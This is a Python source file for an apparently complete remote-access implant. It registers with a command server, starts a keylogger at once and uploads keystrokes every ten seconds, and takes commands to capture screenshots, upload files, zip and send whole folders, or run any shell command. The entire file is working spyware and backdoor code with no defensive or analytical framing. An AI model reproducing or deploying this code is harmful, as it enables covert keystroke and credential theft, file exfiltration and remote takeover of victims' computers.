import os
import time
import requests
import subprocess
import socket
import base64
import tempfile
import mss
import mss.tools
import io
import threading
import keyboard
import shutil
import tempfile
from PIL import Image
import sys

AGENT_ID = f"pywinagent-{os.environ.get('COMPUTERNAME', 'unknown')}"
SERVER_URL = "http://localhost:8080"

current_dir = os.getcwd()


def get_os():
    return os.name


def get_ip():
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        ip = s.getsockname()[0]
        s.close()
        return ip
    except:
        return "127.0.0.1"


def register_agent():
    data = {
        "agentId": AGENT_ID,
        "agentIp": get_ip(),
        "agentOs": get_os(),
        "agentStatus": "ACTIVE",
    }
    try:
        requests.post(f"{SERVER_URL}/agents", json=data, timeout=5)
    except Exception as e:
        print(f"[!] Registration failed: {e}")


def send_result(command_id, result):
    data = {"agentId": AGENT_ID, "commandId": command_id, "resultText": result}
    try:
        requests.post(f"{SERVER_URL}/results/save", data=data, timeout=5)
    except Exception as e:
        print(f"[!] Result send failed: {e}")


def update_command_status(command_id):
    try:
        requests.put(f"{SERVER_URL}/commands/assign/{command_id}/EXECUTED", timeout=5)
    except Exception as e:
        print(f"[!] Command status update failed: {e}")


def take_screenshot():
    try:
        with mss.mss() as sct:
            screenshot = sct.grab(sct.monitors[0])
            img = Image.frombytes("RGB", screenshot.size, screenshot.rgb)
            buf = io.BytesIO()
            img.save(buf, format="PNG")
            b64 = base64.b64encode(buf.getvalue()).decode()
            return b64
    except Exception as e:
        print(f"[!] Screenshot failed: {e}")
        return None


def upload_screenshot(b64data):
    data = {"agentId": AGENT_ID, "screenshotData": b64data}
    try:
        r = requests.post(f"{SERVER_URL}/screenshots/upload", json=data, timeout=10)
        if r.status_code != 200:
            print(f"[!] Screenshot upload failed: {r.status_code}")
    except Exception as e:
        print(f"[!] Screenshot upload error: {e}")



keylogger_running = False
keylogger_buffer = []
keylogger_thread = None


def keylogger_worker():
    global keylogger_running, keylogger_buffer
    try:

        def on_key(event):
            if event.event_type == "down":
                keylogger_buffer.append(event.name)

        keyboard.hook(on_key)
        while keylogger_running:
            time.sleep(0.1)
        keyboard.unhook_all()
    except Exception as e:
        print(f"[!] Keylogger error: {e}")


def start_keylogger():
    global keylogger_running, keylogger_thread
    if keylogger_running:
        return
    try:
        keylogger_running = True
        keylogger_thread = threading.Thread(target=keylogger_worker, daemon=True)
        keylogger_thread.start()
    except Exception as e:
        print(f"[!] Failed to start keylogger: {e}")


def stop_keylogger():
    global keylogger_running, keylogger_thread, keylogger_buffer
    if not keylogger_running:
        return
    try:
        keylogger_running = False
        if keylogger_thread:
            keylogger_thread.join(timeout=2)
        log = " ".join(keylogger_buffer)
        send_keylog(log)
        keylogger_buffer = []
    except Exception as e:
        print(f"[!] Failed to stop keylogger: {e}")


def send_keylog(log):
    data = {"agentId": AGENT_ID, "logText": log}
    try:
        r = requests.post(f"{SERVER_URL}/keylogger/log", json=data, timeout=10)
    except Exception as e:
        print(f"[!] Keylog send failed: {e}")


# File/folder fetch logic


def fetch_and_execute():
    try:
        r = requests.get(f"{SERVER_URL}/commands/agents/{AGENT_ID}/pending", timeout=5)
        if r.status_code != 200:
            return
        cmds = r.json()
        for cmd in cmds:
            command = cmd.get("command", "")
            command_id = cmd.get("commandId", "")
            result = ""
            if command.startswith("cd "):
                path = command[3:].strip()
                try:
                    os.chdir(path)
                    global current_dir
                    current_dir = os.getcwd()
                    result = f"Changed directory to {current_dir}"
                except Exception as e:
                    result = f"Failed to change directory: {e}"
            elif command.startswith("list_dir "):
                path = command[9:].strip()
                try:
                    files = os.listdir(path)
                    result = "\n".join(files)
                except Exception as e:
                    result = f"Failed to list directory: {e}"
            elif command == "screenshot":
                b64 = take_screenshot()
                if b64:
                    upload_screenshot(b64)
                    result = "Screenshot taken and uploaded."
                else:
                    result = "Screenshot failed."
            elif command.startswith("fetch_file "):
                filepath = command[len("fetch_file ") :].strip()
                try:
                    if not os.path.isfile(filepath):
                        result = f"File not found: {filepath}"
                    else:
                        with open(filepath, "rb") as f:
                            files = {"file": (os.path.basename(filepath), f)}
                            data = {"agentId": AGENT_ID}
                            r = requests.post(
                                f"{SERVER_URL}/files/upload",
                                files=files,
                                data=data,
                                timeout=30,
                            )
                            if r.status_code == 200:
                                result = f"File uploaded: {filepath}"
                            else:
                                result = f"File upload failed: {filepath} (status {r.status_code})"
                except Exception as e:
                    result = f"File upload error: {filepath} ({e})"
                    print(f"[AGENT DEBUG] Exception: {e}")
            elif command.startswith("zip "):
                folderpath = command[len("zip ") :].strip()
                try:
                    if not os.path.isdir(folderpath):
                        result = f"Folder not found: {folderpath}"
                    else:
                        with tempfile.NamedTemporaryFile(
                            suffix=".zip", delete=False
                        ) as tmpf:
                            archive_path = tmpf.name
                        shutil.make_archive(
                            archive_path.replace(".zip", ""), "zip", folderpath
                        )
                        with open(archive_path, "rb") as f:
                            files = {"file": (os.path.basename(archive_path), f)}
                            data = {"agentId": AGENT_ID}
                            r = requests.post(
                                f"{SERVER_URL}/files/upload",
                                files=files,
                                data=data,
                                timeout=60,
                            )
                            if r.status_code == 200:
                                result = f"Folder uploaded as zip: {archive_path}"
                            else:
                                result = f"Folder upload failed: {folderpath} (status {r.status_code})"
                        os.remove(archive_path)
                except Exception as e:
                    result = f"Folder upload error: {folderpath} ({e})"
                    print(f"[AGENT DEBUG] Exception: {e}")
            else:
                try:
                    proc = subprocess.Popen(
                        command,
                        shell=True,
                        cwd=current_dir,
                        stdout=subprocess.PIPE,
                        stderr=subprocess.PIPE,
                    )
                    out, err = proc.communicate(timeout=30)
                    result = out.decode(errors="ignore") + err.decode(errors="ignore")
                except Exception as e:
                    result = f"[error running command] {e}"
            send_result(command_id, result)
            update_command_status(command_id)
    except Exception as e:
        print(f"[!] Fetch/execute failed: {e}")


if __name__ == "__main__":
    register_agent()
    start_keylogger()  # Start keylogger immediately
    last_sent = time.time()
    while True:
        fetch_and_execute()
        # Send keylog every 10 seconds
        if time.time() - last_sent > 10:
            stop_keylogger()
            start_keylogger()
            last_sent = time.time()
        time.sleep(2)
